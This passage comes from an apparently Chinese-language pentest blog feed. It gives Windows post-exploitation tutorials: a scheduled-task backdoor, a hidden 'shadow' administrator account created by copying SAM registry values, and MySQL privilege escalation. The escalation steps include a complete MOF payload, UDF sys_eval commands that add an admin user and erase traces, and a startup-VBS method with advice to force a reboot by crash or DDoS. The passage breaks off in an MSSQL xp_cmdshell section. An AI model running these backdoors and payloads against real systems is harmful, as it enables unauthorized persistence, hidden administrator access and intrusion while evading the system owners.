style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">m monthl,month.] </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">i ldieTime] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">st StartTime] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sd StartDate] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ed EndDate] [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">s computer [</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">u [domain\</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">juser /p password]] [/ru {[Domain\]User "System"} [/rp Password]] /?</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>计划任务后门制作</h4>
-<p>计划任务后门分为管理员权限和普通权限两种，管理员权限的后门可以设置更多的计划任务，例如重启后运行等</p>
-<p>创建计划后门的基本命令</p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">create </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tn </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"任务名称"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tr cmd.exe </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sc minute </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">mo </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        #该命令表示每分钟执行一次cmd.exe</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">query </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tn </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"任务名称"</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">                                  #查看某计划任务:将“任务名称”替换为您要查看的任务的实际名称。</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">schtasks </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">query                                             </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#查看所有计划任务：然后按Enter键。</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​​</p>
-<h2>影子账户</h2>
-<p>在注册表中打开 HKEY LOCAL MACHINE/SAM/SAM/Domains/Account/Users/选项，点击Names菜单 注意:如果进入SAM后无法再看到里面的子选项，需要给予administrators完全控制权限，并重新进入注册表</p>
-<ol>
-<li>
-<p>创建隐藏账户</p>
-<p>​​</p>
-</li>
-<li>
-<p>打开注册表  给权限 <span data-type="text" style="color: var(--b3-font-color8);"> 给完权限查询打开</span></p>
-<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#D19A66">HEKY_LOCAL_MACHINE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">\</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF">SAM\SAM\Domains\Account\User在SAM\SAM</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>​​</p>
-</li>
-<li>
-<p>“Users”里包含的就是该帐户的权限的键值</p>
-<p>​​</p>
-</li>
-<li>
-<p>把Administrator的F键值的内容替换掉hack的F键值（这样hack也有管理员权限了）</p>
-<p>​​</p>
-</li>
-<li>
-<p>将隐藏用户的名字和权限注册表导出</p>
-<p>​​</p>
-</li>
-<li>
-<p>删除账户</p>
-<p>​​</p>
-</li>
-<li>
-<p>双击两个文件添加</p>
-<p>​​</p>
-</li>
-<li>
-<p>影子用户创建完成，net user和计算机管理中都看不见zxk$用户，只有注册表中可以看见，且具有管理员权限</p>
-<p>​​</p>
-</li>
-</ol>
-<p>‍</p>
-<p>‍</p>
-]]></content>
-    <category term="渗透测试"/>
-    <published>2023-09-20T00:00:00.000Z</published>
-  </entry>
-  <entry>
-    <title type="text">Windows系统提权技术与实战案例</title>
-    <id>https://min168.top/perm/Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B.html</id>
-    <link href="https://min168.top/perm/Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B.html"/>
-    <updated>2026-07-26T07:49:45.000Z</updated>
-    <summary type="html"><![CDATA[<h4>windows提权分类</h4>
-<p>1.系统漏洞提权(Linux、Windows)内核提权<br>
-3.第三方软件/服务提权<br>
-2.数据库提权<br>
-4.系统配置错误提权</p>
-<h4>windows提权概述</h4>
-<p>提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提升后，对接下来的渗透有很大帮助。<br>
-windows:</p>
-<p>user--&gt;System<br>
-user--&gt;Administrator</p>]]></summary>
-    <content type="html"><![CDATA[<h4>windows提权分类</h4>
-<p>1.系统漏洞提权(Linux、Windows)内核提权<br>
-3.第三方软件/服务提权<br>
-2.数据库提权<br>
-4.系统配置错误提权</p>
-<h4>windows提权概述</h4>
-<p>提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提升后，对接下来的渗透有很大帮助。<br>
-windows:</p>
-<p>user--&gt;System<br>
-user--&gt;Administrator</p>
-<p>Linux:<br>
-user--&gt;Root</p>
-<h4>windows提权流程</h4>
-<p>获得目标机shll=&gt;查看补丁记录=&gt;寻找对应EXP=&gt;使用Exp提权</p>
-<h4>1.windows系统漏洞提权</h4>
-<ol>
-<li>
-<p>查看这台主机还有哪些漏洞没有修复</p>
-<p>方法一：在cmd中输入systeminfo查看补丁安装情况</p>
-<p>​​</p>
-<p>方法二：通过命令查询出哪些补丁没有安装</p>
-</li>
-<li>
-<p>查找补丁对应的漏洞号 使用在线查询工具</p>
-<p><a href="http://blog.neargle.com/win-powerup-exp-index/#" target="_blank" rel="noopener noreferrer">http://blog.neargle.com/win-powerup-exp-index/#</a></p>
-<p><a href="http://tools.sbbbb.cn/tiquan/" target="_blank" rel="noopener noreferrer">http://tools.sbbbb.cn/tiquan/</a></p>
-<p><a href="http://bypass.tidesec.com/exp/" target="_blank" rel="noopener noreferrer">http://bypass.tidesec.com/exp/</a></p>
-</li>
-<li>
-<p>查找对应提权exp</p>
-<p>可在搜索引擎查找</p>
-<p>github查找  <a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener noreferrer">github.com/SecWiki/windows-kernel-exploits</a></p>
-<p>windows中提权exp的格式为</p>
-<p>​​</p>
-</li>
-<li>
-<p>配合msf进行提权</p>
-</li>
-</ol>
-<h4>2.windows 数据库提权</h4>
-<h5>mysql-mof提权步骤</h5>
-<ol>
-<li>
-<p>在可写目录中上传mof文件</p>
-<p>nullevt.mof   文件</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#pragma namespace("\\\\.\\root\\subscription")</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> __EventFilter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $EventFilter</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">EventNamespace</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Root</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Cimv2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "filtP2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Query</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "Select * From __InstanceModificationEvent "</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"Where TargetInstance Isa </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Win32_LocalTime</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> "</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"And TargetInstance.Second = 5"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">QueryLanguage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "WQL"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ActiveScriptEventConsumer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $Consumer</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "consPCSV2"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ScriptingEngine</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "JScript"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ScriptText</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"var WSH = new ActiveXObject(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">WScript.Shell</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">)\nWSH.run(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.exe user zhang 123456 /add</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">)"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> __FilterToConsumerBinding</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Consumer</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $Consumer</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Filter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $EventFilter</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">};</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>把.mof脚本移动到指定的目录：c:/windows/system32/wbem/mof/目录下，该目录每5秒执行一次​</p>
-</li>
-<li>
-<p>执行 load file 及 into dumpfile 把文件导出到正确的位置</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> load_file('c:/phpstudy/www/nullevt.mof')into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> dumpfile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'c:/windows/system32/wbem/mof/nullevt.mof'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
-<li>
-<p>执行成功后，验证mof文件中的cmd命令是否执行</p>
-<p>​​</p>
-</li>
-<li>
-<p>同样的方法修改mof文件再重复上次的步骤，可以将用户添加到管理员组</p>
-</li>
-</ol>
-<p>‍</p>
-<h5>mysql-UDF提权</h5>
-<h6>UDF提权原理</h6>
-<p><span data-type="text" style="color: var(--b3-font-color8);">UDF(User Defined Function)用户自定义函数,支持用户自定义</span></p>
-<p>通过添加新的函数，<span data-type="text" style="color: var(--b3-font-color8);">对mysqI服务器进行功能扩充，从而创建函数，将MYSQL账号转化为系统system权限</span></p>
-<p>UDF提权是通过root权限导出udf.dll到系统目录下，可以<span data-type="text" style="color: var(--b3-font-color8);">通过udf.dll调用执行cmd</span></p>
-<h6>利用UDF提权条件</h6>
-<ol>
-<li>
-<p>Windows 2000、XP、2003</p>
-</li>
-<li>
-<ol start="2">
-<li>MySQL数据库版本</li>
-</ol>
-</li>
-<li>
-<p>3.账号具有对MySQL的插入和删除权限</p>
-</li>
-<li>
-<p>4.可以将udf.d写入到相应目录的权限</p>
-<p>​​</p>
-</li>
-</ol>
-<h6>MySQL-UDF提权步骤</h6>
-<ol>
-<li>
-<p>收集必要信息</p>
-<p>select version();   select user();    select @@basedir,    //获取数据库版本 //获取数据库用户 //获取数据库安装目录</p>
-</li>
-</ol>
-<p>​​</p>
-<ol start="2">
-<li>
-<p>MySQL版本高于5.1，创建导出文件夹</p>
-<p>/lib/plugin目录本身是不存在的，可以利用NTFS ADS流来创建文件夹</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'xxx'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> dumpfile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'MySQL目录\\lib::$INDEX ALLOCATION'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'xxx'</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> dumpfile </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'MySQL目录\\lib\\plugin::$INDEX ALLOCATION'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>也可以利用webshell直接在mysql安装路径下创建piugin目录</p>
-</li>
-<li>
-<p>导入 udf.dl 文件</p>
-<p>DLL文件的获取方法:</p>
-<p>在 sqlmap/data/udf/mysq!/ 目录下,</p>
-<p>在Windows目录中有32位和64位dll文件(MySQL的位数，文件夹中的dll文件是通过异或编码的，可以使用sqlmap/extra/cloak.py进行解密</p>
-<p>将dll文件上传到mysql的/Iib/plugin目录下</p>
-<p>​​</p>
-</li>
-<li>
-<p>创建自定义函数</p>
-<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> function</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sys_eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> returns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> soname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'udf.dll'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#创建自定义函数  需要创建.dll文件中存在的函数才可以</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> sys_eval("net</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> user youze1 123456 /add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">");   #创建用户</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">select sys_eval("</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">net localgroup administrators youze1 /add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"); #提升为管理员权限</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">drop function sys_eval;  #清除痕迹</span></span>
-<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">delete from mysql.func where name="</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">sys_eval</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">";</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-</ol>
-<p>​​</p>
-<h5>mysql启动项提权</h5>
-<h6>原理</h6>
-<p>将一段 VBS脚本导入到<span data-type="text" style="color: var(--b3-font-color8);">开机启动项中</span>，如果管理员重启了服务器，那么就会自动调用该脚本，并执行其中的用户添加 及提权命令</p>
-<h6>利用条件:</h6>
-<ol>
-<li>
-<p>上传到目录必须具备可读写的权限</p>
-</li>
-<li>
-<p>调用的 cmd 也必须有足够的权限</p>
-</li>
-<li>
-<p>重启服务器可以利用一些可导致服务器蓝屏的EXP，或者DDoS拒绝服务</p>
-</li>
-</ol>
-<h6>步骤</h6>
-<ol>
-<li>
-<p>如果可以直接上传到启动项目录就不需要使用数据库</p>
-<p>C:\Documents and Settings\All Users\「开始」菜单\程序\启动 目录存在可读写的权限</p>
-</li>
-<li>
-<p>进入test数据库，并创建一个新的表:</p>
-<p>create table a(cmd text)  // a表名，字段名cmd，text文本类型</p>
-</li>
-<li>
-<p>在表中插入数据</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"set wshshell=createobject(""wscript.shell"")"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">); </span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"a=wshshell.run(""cmd.exe /c net user icg 123.com /add"" 0)"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">); </span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">insert into</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">values</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"b=wshshell.run(""cmd.exe /c net localgroup administrators icg /add"",0)"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">);</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>输出表为一个 VBS 的脚本文件</p>
-<p>select * from a into dumpfile "C:\Documents and Settings\Administrator\「开始」菜单\程序启动\1.vbs"</p>
-</li>
-<li>
-<p>利用其他手段重启电脑</p>
-</li>
-</ol>
-<h5>MSSQL xp_cmdshell提权</h5>
-<ol>
-<li>
-<p>连接数据库之后</p>
-</li>
-<li>
-<p>查看相干信息</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--查看当前版本:</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> @@</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">version</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--判断当前是否为sa:</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'sysadmin'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--判断是否有public权限，可以爆破表:</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'public'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span></span>
-<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">--判断当前用户写文件、读文件的权限:</span></span>
-<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> is_srvrolemember</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'db_owner'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
-<li>
-<p>查看数据库中是否有 xp_cmdshell 扩展存储插件,返回值为 1则说明该数据库中有插件     MSSQL使用xp_cmdshell</p>
-<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">select</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> count</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(*) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> master</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">dbo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.sysobjects </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">where</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> xtype</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span 